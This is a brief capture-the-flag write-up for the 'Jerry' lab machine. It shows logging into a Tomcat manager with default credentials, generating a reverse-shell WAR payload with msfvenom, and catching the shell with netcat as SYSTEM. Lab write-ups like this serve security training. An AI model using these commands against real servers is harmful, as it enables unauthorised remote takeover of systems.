# Jerry

We have an open 8080 port and we verify it is a Tomcat. We check for the manager app and it
uses default credentials "tomcat" and "s3cret". We have it easy, we just need to upload our
payload in war format. We use *msfvenom* utility:

```
msfvenom -p java/jsp_shell_reverse_tcp -f war LHOST=[ip] LPORT=[port] -o brilemau.war
```

We upload the war file and we start to listen with netcat:

```
nc -lvp [port]
```

When we access to the deployed war we should get a shell directly as **system user**.
